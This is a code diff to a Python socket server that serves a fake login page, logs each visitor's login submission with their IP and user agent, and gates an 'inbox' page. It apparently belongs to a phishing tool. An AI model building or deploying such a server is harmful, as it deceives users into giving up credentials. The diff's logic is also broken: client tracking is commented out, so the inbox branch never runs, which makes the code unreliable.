@@ -57,7 +57,7 @@ def run(handler):
     try:
         while running and (time.time() - tic) < runtime:
             client, client_addr = handler.accept()
-            clients.append(client_addr[0])
+            # clients.append(client_addr[0])
             try:
                 request = client.recv(2048)
             except socket.error:
@@ -71,6 +71,10 @@ def run(handler):
                         user_agent = ln.split('User-Agent:')[1].replace('\n', '')
                     except IndexError:
                         pass
+            if client_addr[0] not in list(set(clients)):
+                new_client = True
+            else:
+                new_client = False
             # Serve login page to new connections, and handle logins
             if 'GET / HTTP/1.1' in request.split('\r\n'):
                 client.send(open('login.html', 'rb').read())
@@ -80,14 +84,14 @@ def run(handler):
                 try:
                     os.remove('info.html')
                 except OSError:
-                    pass
+                    continue
             # Display information about downloading the client
             elif 'GET /favicon.ico HTTP/1.1' in request.split('\r\n'):
                 time.sleep(0.1)
             elif 'POST / HTTP/1.1' in request.split('\r\n'):
                 open(log_file_name, 'a').write('[*] %s is submitting login information.\nUser Agent: %s\n' %
                                                (client_addr[0], user_agent))
-            elif 'GET /inbox HTTP/1.1' in request.split('\r\n'):
+            elif 'GET /inbox HTTP/1.1' in request.split('\r\n') and not new_client:
                 print '[*] Serving %s their inbox' % client_addr[0]
 
             elif 'GET /info HTTP/1.1' in request.split('\r\n'):
